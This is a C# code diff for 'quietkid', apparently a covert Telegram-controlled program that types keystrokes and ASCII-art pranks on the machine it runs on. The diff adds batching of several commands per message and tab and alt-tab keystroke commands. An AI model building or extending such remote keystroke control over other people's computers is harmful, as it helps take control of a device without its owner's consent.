@@ -78,8 +78,15 @@ namespace quietkid
         {
             var message = messageEventArgs.Message;
             if (message == null || message.Type != MessageType.Text || message.Chat.Id != Secure.me)
+                // MARK:
+                // Uncomment to see all unknown incoming chat ids
+                // Debug.Print(message.Chat.Id.ToString());
                 return;
-            await HandleMessageText(message.Text);
+            string[] messages = message.Text.Split(';');
+            foreach (string i in messages)
+            {
+                await HandleMessageText(i);
+            }
         }
 
         static async Task PerformCommand(string command)
@@ -97,34 +104,36 @@ namespace quietkid
                             );
                             break;
                         }
+                        // FIXME:
+                        // Get rid of repeating replacements
                         switch (command)
                         {
                             case "shrek":
-                                InsertPlain(ASCII.Shrek);
+                                InsertPlain(ASCII.Shrek.Replace('\n', ' '));
                                 break;
                             case "toucan":
-                                InsertPlain(ASCII.Toucan);
+                                InsertPlain(ASCII.Toucan.Replace('\n', ' '));
                                 break;
                             case "patrick":
-                                InsertPlain(ASCII.Patrick);
+                                InsertPlain(ASCII.Patrick.Replace('\n', ' '));
                                 break;
                             case "patrickBack":
-                                InsertPlain(ASCII.PatrickIsBack);
+                                InsertPlain(ASCII.PatrickIsBack.Replace('\n', ' '));
                                 break;
                             case "amogus":
-                                InsertPlain(ASCII.Amogus);
+                                InsertPlain(ASCII.Amogus.Replace('\n', ' '));
                                 break;
                             case "deez":
-                                InsertPlain(ASCII.DeezNuts);
+                                InsertPlain(ASCII.DeezNuts.Replace('\n', ' '));
                                 break;
                             case "putin":
-                                InsertPlain(ASCII.Putin);
+                                InsertPlain(ASCII.Putin.Replace('\n', ' '));
                                 break;
                             case "hacking":
-                                InsertPlain(ASCII.Hacking);
+                                InsertPlain(ASCII.Hacking.Replace('\n', ' '));
                                 break;
                             case "sus":
-                                InsertPlain(ASCII.Sus);
+                                InsertPlain(ASCII.Sus.Replace('\n', ' '));
                                 break;
                             default:
                                 throw new Exception("Unknown ascii");
@@ -360,6 +369,12 @@ namespace quietkid
                     Process.Start(Environment.CurrentDirectory + "\\1.vbs");
                     await Task.Delay(1000);
                     Environment.Exit(0);
+                    break;
+                case "/tab":
+                    InsertPlain("{TAB}");
+                    break;
+                case "/alttab":
+                    InsertPlain("%{TAB}");
                     break;
                 default:
                     await PerformCommand(messageText);
